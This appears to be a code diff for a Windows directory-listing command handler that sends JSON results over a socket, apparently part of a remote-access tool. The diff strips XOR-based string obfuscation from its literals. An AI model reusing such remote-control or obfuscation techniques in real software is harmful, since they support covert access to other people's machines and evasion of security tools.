@@ -41,19 +41,19 @@ void handle_ls(SOCKET sock, HANDLE mutex, const char* path) {
         cJSON_AddItemToObject(root, "items", items);
         char* json_str = cJSON_PrintUnformatted(root);
         char* buf = malloc(strlen(json_str) + 32);
-        sprintf(buf, xor_str(_S("[ls_result]%s")), json_str);
+        sprintf(buf, "[ls_result]%s", json_str);
         sock_send(sock, mutex, buf);
         free(buf); free(json_str); cJSON_Delete(root);
         return;
     }
 
     char search_path[MAX_PATH];
-    sprintf(search_path, xor_str(_S("%s\\*")), path);
+    sprintf(search_path, "%s\\*", path);
 
     WIN32_FIND_DATAA ffd;
     HANDLE hFind = FindFirstFileA(search_path, &ffd);
     if (hFind == INVALID_HANDLE_VALUE) {
-        fb_error(sock, mutex, xor_str(_S("[ls_result]")), xor_str(_S("Directory not found or access denied")));
+        fb_error(sock, mutex, "[ls_result]", "Directory not found or access denied");
         return;
     }
 
@@ -78,24 +78,24 @@ void handle_ls(SOCKET sock, HANDLE mutex, const char* path) {
         SYSTEMTIME st;
         FileTimeToSystemTime(&ft, &st);
         char mtime[32];
-    sprintf(mtime, xor_str(_S("%02d.%02d.%d %02d:%02d")), st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
-    cJSON_AddStringToObject(item, xor_str(_S("mtime")), mtime);
+        sprintf(mtime, "%02d.%02d.%d %02d:%02d", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
+        cJSON_AddStringToObject(item, "mtime", mtime);
 
         if (!is_dir) {
             char* dot = strrchr(ffd.cFileName, '.');
-        cJSON_AddStringToObject(item, xor_str(_S("ext")), dot ? dot : "");
+            cJSON_AddStringToObject(item, "ext", dot ? dot : "");
         } else {
-        cJSON_AddStringToObject(item, xor_str(_S("ext")), "");
+            cJSON_AddStringToObject(item, "ext", "");
         }
 
         cJSON_AddItemToArray(items, item);
     } while (FindNextFileA(hFind, &ffd));
 
     FindClose(hFind);
-cJSON_AddItemToObject(root, xor_str(_S("items")), items);
+    cJSON_AddItemToObject(root, "items", items);
     char* json_str = cJSON_PrintUnformatted(root);
     char* buf = malloc(strlen(json_str) + 32);
-sprintf(buf, xor_str(_S("[ls_result]%s")), json_str);
+    sprintf(buf, "[ls_result]%s", json_str);
     sock_send(sock, mutex, buf);
     free(buf); free(json_str); cJSON_Delete(root);
 }
